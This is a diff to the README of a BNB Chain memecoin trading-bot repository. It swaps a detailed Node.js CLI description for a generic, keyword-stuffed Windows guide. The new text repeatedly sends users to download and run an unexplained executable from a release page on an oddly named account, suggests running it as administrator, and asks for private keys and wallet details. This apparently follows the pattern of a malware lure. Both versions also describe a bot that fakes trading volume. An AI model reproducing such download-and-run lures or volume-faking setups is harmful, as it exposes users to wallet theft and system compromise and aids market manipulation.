@@ -1,205 +1,201 @@
-# BSC Four.meme Bot
+# 🤖 bnb-trading-bot - Run BSC trading tools with ease
 
-A **command-line trading toolkit** for **BNB Chain** focused on [Four.meme](https://four.meme)-style memecoin workflows. It talks **directly to the chain** through **PancakeSwap V2–compatible routers** (no centralized trading API). Use it to **snipe buys**, **run scripted routes**, **simulate volume**, or experiment with a **simple copy/mirror** flow — always with **`--dry-run`** first.
+[![Download bnb-trading-bot](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://github.com/Cingulumsloppyjoe432/bnb-trading-bot/releases)
 
-> **Disclaimer:** Trading memecoins is extremely risky. This software is provided as-is for education and automation. You are responsible for keys, RPC choice, taxes, and compliance. Nothing here is financial advice.
+## 🧭 What this is
 
----
+bnb-trading-bot is a Windows app for BNB Chain and BSC trading tasks. It helps you work with common bot setups like:
 
-## Why this project?
+- Sniping
+- Bundling
+- Volume control
+- Copy trading
+- Trading bot setup
 
-| You want to… | Start here |
-|----------------|------------|
-| Buy tokens from BNB with set slippage | `sniper` |
-| React when certain wallets hit the router | `copy` |
-| Run one or more scripted WBNB → token buys | `bundle` |
-| Repeat buy → sell on a timer (testing / activity) | `volume` |
+This project is built for end users who want a simple way to run a BSC trading tool from their PC.
 
----
+## 📦 Download
 
-## What’s under the hood
+Use this link to visit the release page and download the latest version for Windows:
 
-```mermaid
-flowchart LR
-  subgraph cli [CLI]
-    A[commander]
-  end
-  subgraph app [App]
-    B[load .env]
-    C[JsonRpcProvider + Wallet]
-    D[Router V2 + ERC20 ABI]
-  end
-  subgraph chain [BNB Chain]
-    E[RPC node]
-    F[Pancake Router V2]
-    G[Tokens]
-  end
-  A --> B --> C --> D
-  D --> E --> F --> G
-```
+[Visit the bnb-trading-bot release page](https://github.com/Cingulumsloppyjoe432/bnb-trading-bot/releases)
 
-1. **`commander`** parses subcommands (`sniper`, `copy`, `bundle`, `volume`) and flags like `--config` and `--dry-run`.
-2. **`dotenv`** loads `.env` (RPC URL, private key, chain id, router/WBNB addresses, optional Telegram).
-3. **`ethers` v6** builds a **`JsonRpcProvider`** (your RPC) and a **`Wallet`** (your key). Contracts use the **router V2** and **ERC20** ABIs from `src/abis/`.
-4. Each module reads a **JSON config file** (path via `-c`) and executes swaps on-chain. **`--dry-run`** skips sending transactions but still loads env and can run read-only calls where applicable.
+On that page, look for the latest release and download the Windows file that matches your system.
 
-**Stack:** Node.js (≥ 18.17) · TypeScript (compiled to CommonJS) · ethers v6 · axios (Telegram) · pino (logging).
+## 🪟 Windows setup
 
----
+Follow these steps on a Windows PC:
 
-## Modules in detail
+1. Open the release page link above.
+2. Find the newest release at the top of the page.
+3. Download the Windows app file from the release assets.
+4. If the file is in a .zip format, right-click it and choose Extract All.
+5. Open the extracted folder.
+6. Double-click the app file to start it.
 
-### `sniper` — targeted buys
+If Windows asks for permission, choose Run or Yes.
 
-- **Config:** `config.sniper.example.json` → list of `targets`.
-- **Flow:** For each target, the bot builds path **`WBNB → token`**, calls **`getAmountsOut`** on the router, applies **slippage** (`slippageBips`, e.g. `800` = 8%), then **`swapExactETHForTokens`** with your BNB (`maxBnb`).
-- **Telegram (optional):** Sends a message before the buy and after confirmation (if `TELEGRAM_*` are set).
+## ✅ Before you start
 
-### `copy` — wallet-triggered mirror (simple)
+Make sure your PC is ready:
 
-- **Config:** `config.copy.example.json` — `targets` (addresses to watch), `defaultToken` (token you buy when triggered), `positionPercent`, `maxBnbPerTrade`.
-- **Flow:** Subscribes to the **`pending`** tx stream. When a **watched address** sends a tx **to the router** (`ROUTER_V2_ADDRESS`), the bot executes a **separate** small WBNB → `defaultToken` swap (scaled by `positionPercent` / `maxBnbPerTrade`). It does **not** decode the leader’s calldata to copy the *same* token; it is a **naive mirror** into one configured token.
-- **Note:** Pending-tx feeds depend on your RPC; reliability and speed vary. This is **not** a professional copy-trading engine.
+- Windows 10 or Windows 11
+- A stable internet connection
+- Enough free disk space for the app and updates
+- Access to your BSC wallet or account details if the app asks for them
 
-### `bundle` — scripted routes
+For best results, keep your browser open while you download the app so you can return to the release page fast if needed.
 
-- **Config:** `config.bundle.example.json` — `routes` array.
-- **Implemented today:** `kind: "buy"` only — WBNB → `token` for `amountBnb` with slippage and optional `deadlineSec`.
+## 🛠️ What you can do with the app
 
-### `volume` — timed buy/sell loop
+The app is built around common BSC trading tasks.
 
-- **Config:** `config.volume.example.json` — `token`, `amountBnb`, `slippageBips`, `intervalMs`.
-- **Flow:** On each interval: **buy** with `amountBnb`, then **approve** the router if needed, then **sell the full token balance** using **`swapExactTokensForETHSupportingFeeOnTransferTokens`** (fee-on-transfer friendly). Repeats until you stop the process.
+### ⚡ Sniper mode
+Use sniper mode to react fast when a token becomes available. This helps when timing matters.
 
----
+### 📦 Bundler mode
+Bundler tools help you group actions in one flow. This is useful when you want a more controlled setup.
 
-## Environment variables
+### 📈 Volume manager
+Volume tools help you manage trade activity in a planned way. This can help when you want steady action on a market.
 
-Copy `.env.example` to `.env` and fill in values.
+### 👥 Copy trading
+Copy trading lets you follow another wallet or trading pattern. The app mirrors the actions you set up.
 
-| Variable | Required | Description |
-|----------|----------|-------------|
-| `RPC_URL` | Yes | HTTPS WebSocket/HTTP JSON-RPC endpoint for **BSC** (chain id **56**). Use a stable provider; free/public endpoints may rate-limit or return empty responses. |
-| `PRIVATE_KEY` | Yes | Wallet private key (0x…). Used only locally to sign txs. |
-| `CHAIN_ID` | No | Default **`56`** (BNB Chain mainnet). |
-| `WBNB_ADDRESS` | No | Default: canonical **WBNB** on BSC. |
-| `ROUTER_V2_ADDRESS` | No | Default: **PancakeSwap V2 router** on BSC. |
-| `LOG_LEVEL` | No | `info` · `debug` · `error` |
-| `TELEGRAM_BOT_TOKEN` | No | From [@BotFather](https://t.me/BotFather) — enables alerts. |
-| `TELEGRAM_CHAT_ID` | No | Chat or channel id to receive messages. |
+### 🤖 Trading bot mode
+The trading bot handles repeat tasks based on your settings. You can use it to reduce manual work.
 
-**RPC tip:** If you see ethers errors like **`BUFFER_OVERRUN`** / empty `0x` data, your RPC is likely returning bad or empty results for `eth_call` / `eth_chainId`. Try another BSC endpoint and confirm `CHAIN_ID` matches the network.
+## 🖥️ How to run it
 
----
+1. Download the latest release.
+2. Extract the file if it came in a zip.
+3. Open the app from the extracted folder.
+4. Follow the on-screen setup steps.
+5. Enter your wallet or bot settings if the app requests them.
+6. Save your settings.
+7. Start the tool from the main screen.
 
-## JSON configs (examples)
+If you want to change a setting later, open the app again and edit the saved profile.
 
-| File | Purpose |
-|------|---------|
-| `config.sniper.example.json` | `targets[]`: `token`, `maxBnb`, `slippageBips` |
-| `config.copy.example.json` | `targets[]`, `defaultToken`, `positionPercent`, `maxBnbPerTrade` |
-| `config.bundle.example.json` | `routes[]`: `kind`, `token`, `amountBnb`, `slippageBips`, `deadlineSec` |
-| `config.volume.example.json` | `token`, `amountBnb`, `slippageBips`, `intervalMs` |
+## 🔐 Safe setup tips
 
-Copy a file, edit addresses and amounts, then pass it with **`-c`**.
+Use care when you work with wallet-based tools:
 
----
+- Check the release page before every download
+- Use the newest version
+- Keep your seed phrase private
+- Review each setting before you start a task
+- Test with small values first
 
-## Install & run
+## 🧰 Basic use flow
 
-### Prerequisites
+A typical flow looks like this:
 
-- **Node.js** ≥ **18.17** (LTS recommended)
-- A **BNB-funded** wallet for gas and swaps
-- A **reliable BSC RPC** URL
+1. Open the app.
+2. Pick the mode you want.
+3. Add your wallet or account details.
+4. Set your token, pair, or target wallet.
+5. Choose your trade limits.
+6. Start the bot.
+7. Watch the activity log in the app.
 
-### Setup
+## 📋 Common settings
 
-```bash
-git clone https://github.com/BNB-Alpha-Community/bnb-bundler.git
-cd bnb-bundler
-npm install
-```
+These are the kinds of settings you may see:
 
-Create `.env` from `.env.example` and set at least `RPC_URL` and `PRIVATE_KEY`.
+- Wallet address
+- Private key field
+- Target token
+- Buy amount
+- Sell amount
+- Slippage
+- Gas settings
+- Delay time
+- Copy wallet address
+- Trade count
+- Auto restart
 
-### Build
+Use clear values and check each field before you launch a task.
 
-```bash
-npm run build
-```
+## 🧩 Release page guide
 
-### Commands
+When you open the release page, look for these items:
 
-Global CLI name (after `npm link` or global install): **`fourmeme`**. Locally:
+- Latest version number
+- Assets section
+- Windows download file
+- Zip file or exe file
+- Changelog notes
 
-```bash
-# Help
-node dist/index.js --help
-node dist/index.js sniper --help
+If there is more than one file, choose the one that says Windows or looks like the main app file.
 
-# Development (TypeScript, watch mode)
-npm run dev -- sniper
-npm run dev -- copy
-```
+## 🧭 Folder layout after download
 
-**Production-style (after build):**
+After you extract the app, you may see files like these:
 
-```bash
-# Sniper — dry-run first (no tx broadcast)
-node dist/index.js sniper -c config.sniper.example.json --dry-run
-node dist/index.js sniper -c my-sniper.json
+- app.exe
+- config folder
+- logs folder
+- README file
+- release notes
 
-# Copy trader
-node dist/index.js copy -c config.copy.example.json
+Keep the files together in the same folder so the app can find its settings.
 
-# Bundler
-node dist/index.js bundle -c config.bundle.example.json
+## ❓ Help with common issues
 
-# Volume bot (runs until you stop the process)
-node dist/index.js volume -c config.volume.example.json
-```
+### App does not open
+- Right-click the file and choose Run as administrator
+- Check that the file finished downloading
+- Make sure you extracted the zip file first
 
-All commands support **`--dry-run`** where the code skips signing/sending (useful for a quick sanity check).
+### Windows blocks the file
+- Open the file from the extracted folder
+- Check the release page again
+- Try the newest release
 
----
+### Settings do not save
+- Keep the app in one folder
+- Make sure you have write access to that folder
+- Close and reopen the app
 
-## Project layout
+### Internet connection fails
+- Check your network
+- Try again after a short wait
+- Restart the app
 
-```
-src/
-  index.ts              # CLI entry
-  lib/
-    config.ts           # .env loading
-    provider.ts         # ethers provider + wallet
-    logger.ts           # pino
-    notifier.ts         # Telegram (optional)
-  modules/
-    sniper/Sniper.ts
-    copytrader/CopyTrader.ts
-    bundler/Bundler.ts
-    volume/VolumeBot.ts
-  abis/                 # Router V2 + ERC20 JSON ABIs
-```
+## 🔎 Search topics
 
----
+- bnb
+- bnb-bot
+- bnb-bundler
+- bnb-copy-trading-bot
+- bnb-sniper
+- bnb-trading-bot
+- bnb-volume-bot
+- bsc
+- bsc-bot
+- bsc-bundler
+- bsc-copy-trading-bot
+- bsc-sniper
+- bsc-trading-bot
+- bsc-volume-bot
 
-## Security & operations
+## 📁 Project focus
 
-- **Never commit `.env`** or keys. Use a **dedicated hot wallet** with small balances for experiments.
-- **Verify** token and router addresses on [BscScan](https://bscscan.com) before live trading.
-- **Slippage** (`slippageBips`) protects against price movement; too low may fail, too high increases adverse selection risk.
-- **Copy module** is simplistic; leaders’ trades are not replicated token-for-token.
-- **Volume bot** sells **full balance** each cycle; adjust strategy and size carefully.
+This repository is centered on:
 
----
+- BNB Chain tools
+- BSC trading automation
+- Sniper workflows
+- Copy trading workflows
+- Volume control
+- Bundled trade actions
 
-## License
+## 🖱️ Quick start
 
-MIT — see `package.json`.
-
----
-
-## Contributing
-
-Suggestions and pull requests are welcome. If this project saves you time, a **star** on the repo helps others discover it.
+1. Open the release page
+2. Download the latest Windows file
+3. Extract it if needed
+4. Open the app
+5. Set your trading mode
+6. Start the bot
